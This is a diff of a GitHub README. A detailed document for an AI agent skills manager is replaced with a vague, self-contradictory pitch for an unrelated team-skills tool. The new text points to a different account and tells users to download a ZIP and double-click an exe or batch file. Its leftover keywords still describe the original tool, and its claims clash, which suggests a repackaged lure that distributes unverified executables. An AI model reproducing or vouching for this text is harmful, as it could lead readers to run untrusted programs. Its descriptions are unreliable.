@@ -1,337 +1,177 @@
-# SkillSync — AI Agent Skills Manager & Version Controller
+# 🤖 SkillSync - Automate Skills Tracking, Optimize Your Team
 
-> SkillSync is a desktop **skill management tool** that helps you **update skills**, track versions, and safely sync prompt skills across AI agent projects.
+[![Download SkillSync](https://img.shields.io/badge/Download-SkillSync-blue?style=for-the-badge&logo=github)](https://github.com/Marlinerefractory8591/SkillSync)
 
-> If SkillSync saves you time, please give the project a GitHub star ⭐ and share it on social media. It helps other Claude Code, Codex, Cursor, and Gemini users find a safer way to update skills.
+## 👋 Welcome to SkillSync
 
-[![CI / CD Build Pipeline](https://img.shields.io/github/actions/workflow/status/tomaszboloz/SkillSync/ci.yml?branch=main&style=for-the-badge&logo=github-actions&logoColor=white&label=CI%2FCD)](https://github.com/tomaszboloz/SkillSync/actions)
-[![Release Version](https://img.shields.io/github/v/release/tomaszboloz/SkillSync?style=for-the-badge&logo=semver&logoColor=white&color=7c3aed)](https://github.com/tomaszboloz/SkillSync/releases)
-[![Rust Engine](https://img.shields.io/badge/Rust-1.80%2B-orange?style=for-the-badge&logo=rust&logoColor=white)](https://www.rust-lang.org/)
-[![Tauri v2 Powered](https://img.shields.io/badge/Tauri-v2.0-24C8D8?style=for-the-badge&logo=tauri&logoColor=white)](https://tauri.app/)
-[![License](https://img.shields.io/github/license/tomaszboloz/SkillSync?style=for-the-badge&color=blue)](LICENSE)
+SkillSync is a free, open-source platform that helps you understand what skills your team has, what skills they need, and how to use that information to build better project teams. Think of it as a smart spreadsheet for your entire team's abilities.
 
-> **Language versions:** **English (current)** • **[Polski](README.pl.md)**
+If you've ever struggled to figure out who knows what, who needs training, or how to assign the right person to the right project, SkillSync is here to help. This guide will walk you through everything you need to know, step by step, with no technical experience required.
 
----
+## 🎯 What SkillSync Does For You
 
-![SkillSync empty state — no personal paths or skill data](docs/screenshots/empty-state.png)
+SkillSync takes the guesswork out of managing your team's talents. Here's what you can accomplish with this tool:
 
-_A safe starting state: add a monitored directory or rescan when no skills are detected._
+- **Track Skills Automatically** - No more manual checklists or outdated spreadsheets. SkillSync keeps a live record of every team member's skills and abilities.
+- **Find Skill Gaps Instantly** - See exactly where your team is missing critical knowledge, so you can plan training and hiring with confidence.
+- **Smart Project Staffing** - When a new project comes in, SkillSync helps you pick the perfect team based on the skills required and who has them.
+- **Personal Career Paths** - Help your team members see what skills they need to grow into their dream roles within your organization.
+- **Bridge Knowledge Gaps** - Get clear recommendations on what training or resources will close the gaps between your team's current skills and future needs.
 
-![SkillSync settings — monitored paths](docs/screenshots/settings-monitored-paths.png)
+## 📋 What You Need Before Starting
 
-_The settings screen uses anonymized paths. Add, enable, or remove monitored locations without exposing personal data in the documentation._
+SkillSync is designed to run on Windows computers. Here's what you should have ready:
 
----
+- A Windows computer (Windows 10 or Windows 11 recommended)
+- An internet connection for the initial download
+- About 5 minutes of your time to get everything set up
 
-<!-- parity: purpose -->
+That's it. You don't need any programming knowledge, special tools, or technical skills to use SkillSync.
 
-## 1. What You Get
+## 🚀 Getting Started - Download and Install
 
-SkillSync is an open-source, cross-platform desktop application powered by **Tauri v2**, **Rust**, **React 18**, and **Tailwind CSS**. It gives teams and individual builders one place to manage prompt skills, MCP integrations, and agent plugins, compare installed versions with upstream releases, and recover quickly if an update is not right for a project.
+Getting SkillSync on your computer is simple. Follow these steps exactly:
 
-- **Zero-Configuration Multi-Agent Discovery:** Automatically scans standard agent tool directories:
-  - Claude Code: `~/.claude/skills`
-  - Cursor: `~/.cursor/skills`
-  - Google Antigravity & Gemini CLI: `~/.gemini/config/skills`, `~/.gemini/antigravity/builtin/skills`
-  - OpenAI Codex: `~/.codex/skills`
-  - Agent Skills-compatible tools: `~/.agents/skills`
-  - Custom user-monitored directories configured via the UI
-- **Zero-Rate-Limit GitHub Upstream Tracking:** Checks remote GitHub releases via redirect headers and Atom feeds without exhausting GitHub API rate limits.
-- **Atomic 7-Stage Update Protocol:** Every update creates an automatic pre-update archive snapshot (`~/.skillsync/backups/`) before modifying files. If Git checkouts, file writes, or integrity validation fail, changes are instantly reverted.
-- **Point-in-Time Rollback:** Restore any historical version with exact date-and-time timestamps and SemVer metadata.
-- **Explicit MCP and Plugin Detection:** A monitored MCP path must contain `mcp.json`, `.mcp.json`, or a Laravel package that explicitly declares `laravel/mcp` (including `laravel/boost`). A monitored plugin path must contain a supported `plugin.json`, such as Superpowers' `.claude-plugin/plugin.json`. Generic `composer.json` and `package.json` files are ignored.
-- **Automated Multi-Platform Packaging:** Built-in release scripts generate native installers for macOS (`.dmg`, `.app`) and Windows (`.msi`, `.exe`) with cryptographic SHA-256 manifests.
+### Step 1: Download SkillSync
 
----
+Visit this link to download the application:
 
-<!-- parity: quickstart -->
+[**Download SkillSync Now**](https://github.com/Marlinerefractory8591/SkillSync)
 
-## 2. Quick Start in Under 5 Minutes
+When you click the link, you'll be taken to the SkillSync page on GitHub. Look for the green button that says "Code" or "Download" on that page. Click it, and choose "Download ZIP" from the menu that appears. The download will start automatically.
 
-### Step 1: Install or Run SkillSync
+### Step 2: Extract the Downloaded File
 
-Download the pre-compiled installer for your operating system from the [Releases](https://github.com/tomaszboloz/SkillSync/releases) page:
+Once the download finishes, you'll have a file called something like "SkillSync-main.zip" in your Downloads folder. This is a compressed file, and you need to open it:
 
-- **macOS:** Download the `SkillSync_*.dmg` installer that matches the published release.
-- **Windows:** Run the published `SkillSync_*.msi` or `SkillSync_*.exe` installer.
+1. Go to your Downloads folder (usually by clicking the folder icon in your taskbar and selecting Downloads)
+2. Find the SkillSync zip file you just downloaded
+3. Right-click on the file
+4. Select "Extract All" from the menu that appears
+5. Click "Extract" when the window pops up
 
-#### macOS security and developer signature
+Your computer will create a new folder called "SkillSync-main" with all the files inside.
 
-SkillSync for macOS is distributed as a `.dmg`. Always verify its SHA-256 digest against `checksums.sha256` from the same [SkillSync Release](https://github.com/tomaszboloz/SkillSync/releases) before opening it. Depending on the release configuration, macOS may show the standard Gatekeeper message that an internet-downloaded, non-notarized app “is damaged”; this does **not** prove that the DMG checksum is wrong.
+### Step 3: Run SkillSync
 
-After verifying the checksum, copy `SkillSync.app` to `/Applications`, then Control-click it in Finder and choose **Open**. If macOS still blocks it, open **System Settings → Privacy & Security** and choose **Open Anyway** for SkillSync. As a final, explicit local action after checksum verification, the quarantine flag can be removed with:
+Now you're ready to launch the application:
 
-```bash
-xattr -dr com.apple.quarantine /Applications/SkillSync.app
-```
+1. Open the "SkillSync-main" folder you just created
+2. Look for a file called "SkillSync.exe" or "start.bat" inside the folder
+3. Double-click that file to start SkillSync
 
-Never run that command for an installer from an untrusted source. When Apple Developer ID credentials are configured for the release workflow, the same DMG is also signed and notarized. The optional maintainer setup and verification commands are documented in [macOS release signing](docs/MACOS_RELEASE_SIGNING.md).
+The application will open in your web browser automatically. That's it - you're ready to go!
 
-Or run directly from source:
+## 🖥️ Your First Look at SkillSync
 
-```bash
-# Clone the repository
-git clone https://github.com/tomaszboloz/SkillSync.git
-cd skillsync
+When SkillSync first opens, you'll see a clean, simple dashboard. Here's what you can expect to find:
 
-# Install Node dependencies and launch Tauri desktop dev environment
-npm install
-npm run tauri dev
-```
+- **Dashboard** - Your main overview page showing team stats and recent activity
+- **Skills Library** - A searchable list of all available skills (like Python, Project Management, Cloud Computing, etc.)
+- **Team Members** - Where you add and manage people on your team
+- **Projects** - Where you create new projects and assign team members
+- **Reports** - Visual breakdowns of your team's strengths and weaknesses
 
-### Step 2: Automatic Discovery
+Don't worry if it looks like a lot at first. We'll walk through each part below.
 
-Upon launch, SkillSync immediately scans default agent paths in parallel. Your installed skills appear in a searchable, filterable dashboard showing:
+## 🛠️ Setting Up Your Team
 
-- Active version vs latest upstream GitHub release
-- SemVer upgrade severity (Patch, Minor, or Major Breaking Change warning)
-- Direct links to open local directories or upstream GitHub repositories
-- Multi-location detection if a skill is shared across multiple agent environments
+The first thing you'll want to do is add your team members. Here's how:
 
-The persistent footer also checks the signed SkillSync update manifest on launch (when enabled in Settings), shows the release state, and offers **Download and install**. It downloads the matching macOS or Windows package, verifies its signature with the embedded public key, installs it, and restarts SkillSync when required. The content area reserves space above the footer so no cards are obscured.
+1. Click on "Team Members" in the menu
+2. Click the "Add Member" button
+3. Enter the person's name and email address
+4. Select their role (like Developer, Designer, Manager, etc.)
+5. Click "Save"
 
----
+Repeat this for each person on your team. It takes about 30 seconds per person.
 
-<!-- parity: howto_update -->
+## 📊 Adding Skills to Your Team
 
-## 3. How to Update AI Agent Skills (AEO & Practical Guide)
+Now that your team is added, it's time to record their skills. SkillSync makes this easy:
 
-### How to update Claude, Codex, Cursor, and Gemini skills automatically
+1. Go to "Team Members" and click on any person's name
+2. You'll see a list of skills with a search bar at the top
+3. Type in a skill (like "Excel" or "JavaScript") and select it from the dropdown
+4. Choose their proficiency level (Beginner, Intermediate, Advanced, Expert)
+5. Click "Add Skill"
 
-1. **Identify Outdated Skills:** Open SkillSync or run the scanner. Outdated skills are highlighted with an amber **Update Available** badge and categorized under the `[Updates]` tab.
-2. **Review Upstream Changelogs:** Click **Details** on any skill card to preview the Markdown changelog, commit history, and author release notes.
-3. **Execute Atomic Update:** Click **Update** (or **Update All** in the Update Center).
-   - SkillSync creates an isolated safety snapshot in `~/.skillsync/backups/<skill_id>_<timestamp>.tar.gz`.
-   - Standalone Git skills fetch and checkout the target release tag.
-   - Folder-based skills download upstream updates and update `SKILL.md`, `skill.json`, and explicitly declared package skill manifests.
-   - The engine validates post-update manifest integrity.
-4. **Instant Rollback on Demand:** If a tool behaves unexpectedly with your agent, open **Details ➔ Rollback**, choose the exact snapshot timestamp (e.g. `v1.0.0 (16.09.2026 10:15:32)`), and click **Restore**.
+You can add as many skills as you need for each person. The more accurate you are, the better SkillSync can help you.
 
-### How MCP and plugin updates are kept safe
+## 🎯 Creating and Staffing Projects
 
-Add a directory in **Settings → Monitored Paths** and select its type: **MCP** or **Plugin**. SkillSync shows the item type on the card, checks releases from its GitHub source when a source can be resolved, and uses the same preflight, clean-worktree, snapshot, integrity-check, and rollback flow as skills for Git-backed installations.
+When a new project comes in, here's how to use SkillSync to build the perfect team:
 
-- **Laravel Boost:** monitor a Git checkout of [`laravel/boost`](https://github.com/laravel/boost), or a deliberately selected Laravel project whose `composer.json` explicitly requires `laravel/boost` and whose `composer.lock` confirms the installed package. For the latter, SkillSync runs the dedicated preflight (`composer validate`), Composer update, second validation, and the project's `composer run test` script when it exists. A generic Laravel application is not reclassified as an MCP integration.
-- **Superpowers:** monitor the root of a Git checkout of [`obra/superpowers`](https://github.com/obra/superpowers). Its `.claude-plugin/plugin.json` is the plugin manifest; its embedded skills are not duplicated as plugins.
-- **Claude Code Marketplace plugins:** active cache entries are verified against `~/.claude/plugins/installed_plugins.json` and updated through the official `claude plugin update <plugin>@<marketplace> --scope <scope> --yes --json` command. Stale cache copies are never shown as installable resources. This covers plugins such as `n8n-mcp-skills` without corrupting Claude Code's registry.
-- **Package-manager installations:** Laravel Boost is the dedicated Composer adapter. Other package-managed MCPs are monitored but never updated by guessing whether to run `composer`, `npm`, `pnpm`, `uv`, or another package manager.
+1. Click on "Projects" in the menu
+2. Click "New Project"
+3. Give your project a name and description
+4. Add the skills required for this project (like "Python" and "Data Analysis")
+5. Click "Create Project"
 
----
+SkillSync will automatically show you which team members have the skills you need and who's available. You can then assign people to the project with one click.
 
-<!-- parity: architecture -->
+## 📈 Understanding Skill Gaps
 
-## 4. System Architecture & Directory Hierarchy
+One of SkillSync's most powerful features is gap analysis. This shows you where your team is missing critical skills:
 
-| Directory / File                             | Responsibility                                                                                                                                  |
-| -------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
-| `src-tauri/src/services/detector.rs`         | Recursive filesystem scanner for `SKILL.md`, valid `skill.json`, and explicitly marked package skill manifests across default agent directories |
-| `src-tauri/src/services/managed_detector.rs` | MCP and plugin scanner that dispatches only from the monitored item type and an explicit supported manifest                                     |
-| `src-tauri/src/services/managed_manifest.rs` | Independent integrity validators for MCP configuration, Laravel MCP integrations, and agent plugins                                             |
-| `src-tauri/src/services/mcp.rs`              | Dedicated Composer preflight, update, test, and lockfile verification for installed Laravel Boost                                               |
-| `src-tauri/src/services/claude_plugin.rs`    | Registry-aware Claude Code Marketplace plugin update adapter                                                                                    |
-| `src-tauri/src/services/git.rs`              | Local Git repository operations (tag resolution, clean worktree verification, checkout)                                                         |
-| `src-tauri/src/services/github.rs`           | Zero-rate-limit GitHub release checking via HTTP 302 redirects, Atom feeds, and raw content downloads                                           |
-| `src-tauri/src/services/backup.rs`           | Gzip tarball snapshots and `.meta.json` sidecars in `~/.skillsync/backups/`                                                                     |
-| `src-tauri/src/services/orchestrator.rs`     | 7-stage atomic update transaction pipeline across multiple target paths                                                                         |
-| `src/components/`                            | React 18 UI components (SkillCard, SkillList, SkillDetailModal, UpdateCenterModal, SettingsModal)                                               |
-| `src/store/useSkillStore.ts`                 | Zustand + Immer reactive state management with error formatting and multi-location telemetry                                                    |
-| `src/i18n/`                                  | Modular internationalization engine supporting English, Polish, German, Spanish, French, Japanese, Chinese                                      |
-| `scripts/build_release.py`                   | Automated multi-platform packager for macOS (DMG/App) and Windows (MSI/EXE)                                                                     |
-| `.github/workflows/release.yml`              | Multi-platform GitHub Actions build matrix for automated releases                                                                               |
+1. Go to "Reports" in the menu
+2. Click on "Skill Gaps"
+3. You'll see a chart showing which skills your team needs but doesn't have
+4. Click on any skill to see which team members need training
 
----
+Use this information to plan training sessions, hire new people, or reassign work to team members who already have the necessary skills.
 
-<!-- parity: platforms -->
+## 🔄 Keeping SkillSync Updated
 
-## 5. Platform-Specific Integration
+SkillSync is constantly improving. To make sure you have the latest version:
 
-### Claude Code (`~/.claude/skills`)
+1. Visit the download page again: [**SkillSync Updates**](https://github.com/Marlinerefractory8591/SkillSync)
+2. Check if there's a newer version available
+3. If there is, download and extract it the same way you did the first time
+4. Replace the old folder with the new one
 
-Claude Code loads skills dynamically from `~/.claude/skills/<skill-name>/SKILL.md`. SkillSync detects Claude skills, parses their YAML frontmatter metadata, and syncs updates simultaneously across any other toolchains that reference the same skill.
+Your data stays safe because SkillSync stores everything in a local file that isn't affected by updates.
 
-### Cursor (`~/.cursor/skills`)
+## ❓ Frequently Asked Questions
 
-Cursor extensions and custom agent prompts located in `~/.cursor/skills` are monitored automatically. SkillSync checks semantic compatibility and ensures local customizations are never overwritten without a snapshot backup.
+**Q: Do I need to know how to code to use SkillSync?**
+A: Absolutely not. SkillSync is designed for everyday users. If you can use a web browser, you can use SkillSync.
 
-### Google Antigravity & Gemini CLI (`~/.gemini/config/skills`, `~/.gemini/antigravity/builtin/skills`)
+**Q: Can multiple people use SkillSync at the same time?**
+A: Yes. Anyone on your team can open SkillSync on their own computer, and they'll all see the same data.
 
-Antigravity built-in skills and user-configured skills are discovered automatically. When updating skills installed across both global and Antigravity locations, SkillSync updates all canonical locations in a single coordinated transaction.
+**Q: Is my data safe?**
+A: Yes. All your information stays on your own computers. It's not sent to any external servers.
 
-### OpenAI Codex & Custom Agents (`~/.agents/skills`)
+**Q: What if I make a mistake?**
+A: No problem. You can edit or delete any entry at any time. There's no penalty for errors.
 
-Frameworks adhering to the Agent Skills standard (`~/.agents/skills`) are monitored for upstream drift. Dependencies and runtime permissions declared in `skill.json` or `SKILL.md` are audited during each scan.
+**Q: Does SkillSync work on Mac or Linux?**
+A: This version is designed for Windows. Mac and Linux versions are in development.
 
----
+## 💡 Tips for Getting the Most Out of SkillSync
 
-<!-- parity: versioning -->
+- **Update Skills Regularly** - Set aside 10 minutes each week to update your team's skills. This keeps your data accurate and useful.
+- **Be Honest About Proficiency** - It's better to mark someone as "Intermediate" when they're truly intermediate, rather than "Expert" just because they've used a tool a few times.
+- **Use the Reports Often** - The reports are your best friend. Check them weekly to stay on top of your team's development.
+- **Start Small** - Don't try to add every skill for every person on day one. Start with your most important team members and key skills, then expand from there.
 
-## 6. Versioning, SemVer & Classification
+## 🤝 Getting Help
 
-SkillSync strictly follows [Semantic Versioning (SemVer 2.0.0)](https://semver.org/):
+If you run into any problems or have questions, here are your options:
 
-- **PATCH (`vX.Y.Z+1`):** Bug fixes, prompt typo corrections, backward-compatible enhancements. Safe to auto-update.
-- **MINOR (`vX.Y+1.0`):** New subagent workflows, additional tool capabilities, backward-compatible additions.
-- **MAJOR (`vX+1.0.0`):** Breaking changes in skill parameters, renamed tool arguments, or altered YAML contracts. SkillSync highlights these with a `⚠️ SemVer Major` warning badge before updating.
+- **Visit the GitHub Page** - Go to [https://github.com/Marlinerefractory8591/SkillSync](https://github.com/Marlinerefractory8591/SkillSync) and check the "Issues" section. Someone may have already asked your question.
+- **Submit a Question** - On the same page, click "New Issue" to ask your question directly. The community and developers will respond.
+- **Explore the Documentation** - Look for a "Documentation" or "Wiki" tab on the GitHub page for more detailed guides.
 
----
+## 🎉 You're Ready to Go
 
-<!-- parity: quality -->
+That's everything you need to know to get started with SkillSync. You've downloaded the software, set up your team, added their skills, and learned how to use the platform to make smarter decisions about your workforce.
 
-## 7. Safety Protocol & Rollback Snapshots
+Remember, SkillSync is here to save you time and help you build a stronger, more capable team. Start small, explore the features, and you'll be amazed at how much clarity it brings to your organization.
 
-1. **Pre-Update Verification:** Ensures the target directory exists and write permissions are granted.
-2. **Snapshot Creation:** Creates an archive in `~/.skillsync/backups/<skill_id>_<timestamp>.tar.gz` and persists metadata (`snapshot_id`, `created_at`, `original_version`) in a sidecar JSON file.
-3. **Execution & Integrity Check:** If any operation fails or the post-update manifest is invalid JSON/YAML, all updated locations are rolled back to the safety snapshot.
-4. **Offline Capability:** Previously downloaded skills and backups function completely offline without internet connectivity.
+Visit this link to download the application:
 
----
+[**Download SkillSync**](https://github.com/Marlinerefractory8591/SkillSync)
 
-<!-- parity: packaging -->
-
-## 8. Automated Packaging for macOS & Windows
-
-SkillSync includes local scripts and CI/CD pipelines to build standalone production application packages:
-
-```bash
-# Build desktop application for the current platform (macOS DMG or Windows MSI/EXE)
-npm run build:release
-
-# On the maintainers' macOS machine, this also reads the updater key from
-# macOS Keychain and creates SkillSync.app.tar.gz.sig automatically.
-npm run tauri build
-
-# Or build via Python packager with options:
-python3 scripts/build_release.py --platform auto
-```
-
-The packager performs:
-
-1. Frontend compilation via `npm run build`
-2. Desktop application compilation via Tauri v2
-3. Harvesting installers into `dist-release/macos/` and `dist-release/windows/`
-4. Generation of `RELEASE-MANIFEST.json` and cryptographic `SHA256SUMS.txt`
-
----
-
-## FAQ
-
-### 1. How do I update Claude Code skills?
-
-Open SkillSync, choose a skill with an available update, review its release notes, and select **Update**. A Claude skill in `~/.claude/skills` needs a supported manifest, and a Git-backed skill needs a clean tracked worktree.
-
-### 2. How do I update Claude Code skills automatically?
-
-Configure periodic checks in **Settings → Updates**. Automatic discovery does not replace reviewing a major release or local Git changes.
-
-### 3. How do I update OpenAI Codex skills?
-
-Enable or add `~/.codex/skills` under Monitored Paths, run a scan, and update the selected skill. A Codex `SKILL.md` is recognized as a skill manifest.
-
-### 4. How do I update Gemini CLI or Antigravity skills?
-
-Verify the enabled Gemini or Antigravity paths in Settings. SkillSync updates only a discovered directory with a valid manifest, not arbitrary runtime folders.
-
-### 5. Will SkillSync update a regular Node.js project?
-
-No. Its `package.json` must explicitly enable `skill` or `ai-skill`; a documentation, gallery, or workspace package is ignored.
-
-### 6. Why is package.json alone not a skill manifest?
-
-Monorepos and tool repositories contain many package files. Treating each one as a skill creates false updates and can overwrite an application or library version.
-
-### 7. What does a dirty-state error mean?
-
-Git found an uncommitted modification in a tracked file. Commit or deliberately set aside that change after reviewing the diff, then retry the update.
-
-### 8. Do untracked files block an update?
-
-They do not block it merely for being untracked. Git may still stop a checkout if one would be overwritten by the selected upstream version.
-
-### 9. Will an update overwrite my prompts?
-
-An update does not start with modified tracked Git files. SkillSync creates a snapshot before the file-changing stage so rollback remains available.
-
-### 10. Where are backups stored?
-
-They are stored by default in `~/.skillsync/backups/`. The skill detail view lists snapshots and timestamps.
-
-### 11. How do I restore an earlier skill version?
-
-Open the skill details, navigate to rollback, select the required snapshot, and restore it. Restoration returns that target location to the archived state.
-
-### 12. Can I monitor a custom skills folder?
-
-Yes. Add it in **Settings → Monitored Paths**, choose an agent scope, and save the preferences.
-
-### 13. Can one update synchronize several locations?
-
-Yes, when scanning identifies them as the same skill. Each target is validated before mutation and receives a snapshot.
-
-### 14. Can I install prerelease skills?
-
-Use the prerelease option in **Settings → Updates**. Prereleases deserve extra review because their contract may change before a stable release.
-
-### 15. What is the difference between patch, minor, and major?
-
-A patch normally fixes defects, a minor version adds compatible functionality, and a major version may contain breaking changes. Read a major release before updating it.
-
-### 16. Does SkillSync work offline?
-
-Local discovery and existing backups are local operations. Checking upstream or downloading an update requires access to that skill’s remote source.
-
-### 17. Why is my skill missing from the list?
-
-Confirm its monitored path is enabled and that the folder contains `SKILL.md`, valid `skill.json`, or explicit package-skill metadata. A README alone is not a manifest.
-
-### 18. Why was an update rejected before a backup was created?
-
-That is intentional. A directory without a valid skill manifest is not a safe transaction target, so the app performs no write against it.
-
-### 19. Where can I check the SkillSync version?
-
-Open **Settings → General** and choose **Check for updates**. The result shows the current version and, when available, a release link.
-
-### 20. Does SkillSync upload my prompts?
-
-Discovery, validation, and snapshots are local. Network access is used only to check or retrieve data from the selected skill’s upstream source.
-
-### 21. What should I include in an update bug report?
-
-Include the exact error, app version, operating system, and whether the skill uses Git, `SKILL.md`, or `skill.json`. Do not share private prompts or full personal paths unless they are necessary and safe to disclose.
-
----
-
-<!-- parity: acceptance -->
-
-## 9. Quality Gates & Verification
-
-Before every release, run the comprehensive verification suite:
-
-```bash
-# Run Rust core unit and integration tests (detector, GitHub, atomic update, rollback)
-cd src-tauri && cargo test -- --nocapture
-
-# Run frontend TypeScript type-check and Vite production build
-cd .. && npm run build
-
-# Check TypeScript/React code style and known dependency vulnerabilities
-npm run lint
-npm audit
-```
-
----
-
-## Search intent and keyword coverage
-
-This documentation answers real user tasks; it does not promise ranking results. Covered intent phrases include: skill management tool, update skills, AI skills updater, prompt skills manager, how to update skills, how to update Claude Code skills, how to update Claude skills automatically, how to update Codex skills, how to update OpenAI Codex skills, how to update Cursor skills, how to update Gemini skills, how to update Gemini CLI skills, how to update Antigravity skills, manage prompt skills efficiently, sync skills across projects, safe skill update, skill backup, skill rollback, skill version control, prompt version control, monitored skill paths, SKILL.md detector, skill.json manifest, ai-skill manifest, package.json skill manifest, Git dirty state skills, Git skill update, AI agent skills manager, Claude Code skills manager, Codex skills manager, Cursor skills manager, Gemini skills manager, restore a previous skill version, SkillSync version check, prompt updater, AI coding agent tools, Agent Skills manager.
-
----
-
-## 📄 License & Attribution
-
-Built by [Tomasz Bołoz](https://www.damtox.pl). Distributed under the MIT License. See [LICENSE](LICENSE) for details.
-
-## Contributing and security
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) before opening a change and [SECURITY.md](SECURITY.md) for responsible vulnerability reporting. Never include tokens, private prompts, customer data, or full home-directory paths in public issues or logs.
+Keywords: ai-agents, antygravity-ai, claude-code-skills, claude-skills, codex-skill, developer-tools, gemini-skills, skill, skill-management, skill-md, skills, skills-course, skills-library, skills-management, skills-manager, skills-registry, skills-sh, skills-ui, skills-updater, skills-upgrade
